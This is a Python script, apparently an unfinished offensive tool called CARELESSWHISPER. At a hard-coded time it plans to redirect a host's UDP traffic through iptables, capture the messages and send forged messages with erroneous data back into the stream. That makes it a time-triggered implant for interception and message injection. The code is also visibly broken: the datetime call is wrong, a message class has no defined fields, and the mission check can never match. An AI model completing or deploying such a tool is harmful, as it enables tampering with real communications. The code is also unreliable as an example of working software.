#################################################################################
# @note: Classification: Unclass
# @author: Bloodvault - Original Implemenation
# @brief: CARELESSWHISPER is designed to listen, read, and send UDP messages
#################################################################################
# @note: Imports
import socket
import datetime
#################################################################################
# @brief: This function queries the system datetime to use as a trigger
# @note: Don't remember the python getsystemtime() function, but something close to that would work here
# @warning: While loop in main() using this method has not been tested
def triggerStart():
    try:
        triggerTime = '12:59:59'
        now = datetime.now()
        currenttime = now.strftime('%H:%M:%S')
        if currenttime == triggerTime:
            main()
    except:
        return True
        # return False

# @brief: Identify UDP ports open (for send or receive) in order to ID where message traffic is
# @params: mission from main() since this is the first function called after the trigger, will pass down mission params as necessary
# @warning: Using this method will almost certainly miss messages since the list that is created in the for loop is not being simultaneously
#   iterated through. Using threading, or a different technique will be necessary for best results
def udpPortSearch(mission):
    if mission == '5':
        # @note: Psuedo Code
        """```bash/python
        msghost = ip a | grep
        iptables FORWARD table entry all UDP to listen_port
        """
        # @note: Test Values
        msghost = '127.0.0.1'
        listen_port = 10000
        messageFwdListen(listen_port, msghost)
    else:
        exit

# @note: Using iptables for forwarding all UDP traffic, this function is now OBE
# @brief: Function to accomplish port proxy by forwarding traffic from port id'd to a random port in the 50k range
# @param: port from udpPortSearch() to try listening on this port for messages
# @param: msghost from udpPortSearch() returns the IP address of the host which is receiving UDP messages
# @note: This psuedo currently proxies one port at a time and checks for the information. If there is a way to forward all
#   UDP traffic across the device to a port or several that would be ideal to catch everything
# @note: try setting a max buffer size of 240 bits p/frame
# def messageFwd(listen_port,msghost):
#     print()
#     """```bash/windows
#     send_port = random.int(50000,55000)
#     netsh interface portproxy addv4tov4 listenport=listen_port listenaddress=msghost connectaddress=msghost connectport=send_port
#     msgFwdListen(send_port,msghost)
#     """

# @brief: Listen for UDP message
# @param: send_port from messageFwd() is the proxied port which will send all traffic to this listener
# @param: msghost from messageFwd() is the IP address of the host that is sending/receiving messages
# @note: May also want to set a connection.timeout() for troubleshooting, or just for best results
def messageFwdListen(send_port,msghost):
    # @note: Create UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # @note: Location of incoming data
    server_address = (msghost,send_port)
    # @note: Receive data
    sock.bind(server_address)
    print('Waiting for connection')

    ## Pick one of the following message sizes
    # @note: added timeout for debugging
    pkt_size = 240
    sock.settimeout(20)
    connection = sock.recvfrom(pkt_size)

    # Alternatively set the connection size to very large with a timeout buffer
    # pkt_size = 100000000
    # sock.settimeout(60)
    # connection = sock.recvfrom(pkt_size)

    try: 
        recv_data, sender_address = connection
        # print('received:\n    ', recv_data,'from:\n  ',sender_address)
        messageFwdSend(send_port,msghost)
    finally:
        exit

# @brief: Send UDP messages
# @params: send_port from messageFwdListen(), and increment by 1 to avoid port conflict (send/receive on forwarding port)
# @params: msghost from messageFwdListen() is host currently forwarding on
# @params: values currently corresponds to a properly formed message with erroneous data, the specification can be defined in <XXX> function
def messageFwdSend(send_port,msghost):
    # @note: Establish stream
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # @note: Location of hosted stream
    server_address = (msghost, send_port + 1)
    # @note: Connect to local socket
    sock.connect(server_address)
    # @note: Data stream variables
    values = draftMessage(Message.header, 'header') + draftMessage(Message.message, 'message')
    value = ''.join(values)
    byte_values = bytes(value,'utf-8')
    # values = b'100011100101001010010010010001010100010010100101010110110100'
    # @note: Send data
    try:
        print('sending "%s"' % byte_values)
        sock.sendto(byte_values,server_address)
    finally:
        print('closing socket')

# @brief: Function to read int() input data, and output as bits with appropriate field length
# @param: byte - Receive the bits data from UDP stream
# @param: bytesz - Specify the total size of the field , in order to pad the appropriate bytes
# @warning: When initially creating this I used global variables "padded_bits"
def readFieldBits(byte,bytesz):
    # @note: Set if statement to handle int(0) not playing nice
    if byte == 0:
        clean_bits = bin(0).lstrip('0b')
        padded_bits = clean_bits.rjust(bytesz,'0')
    else:
        bits = bin(int(byte))
        clean_bits = bits.lstrip('0b')
        padded_bits = clean_bits.rjust(bytesz,'0')
    return padded_bits

# @brief: Read through list of created inputs for messages
# @note: Uncomment print statements and extra variables for verbose output
# @param: input - the padded message bits received from readFieldBits()
# @param: type - if specified include which part of the message the data is received from (header/data)
def draftMessage(input, type):
    bits_output = []
    for field in input:
        bits_output.append(str(readFieldBits(field[0],field[2])))
    return bits_output

# @brief: Function which parses or validates a message for data
def messageStructure():
    # @note: Define message category values, may want to do this in YAML
    print()

# @brief: Class defining the structure of data messages
class Message:
    def __init__(self):
        self.header = [

        ]
        self.message = [

        ]

# @brief: Main function
def main():
    # @note: Tie numbers to mission execution
    mission = ['1','2','3']
    mission = [0]
    # @note: Wait for trigger before continuing execution
    while triggerStart() == False:
        triggerStart()
    # @note: First function call to start message tracking and sending
    udpPortSearch(mission)




if __name__ == '__main__':
    main()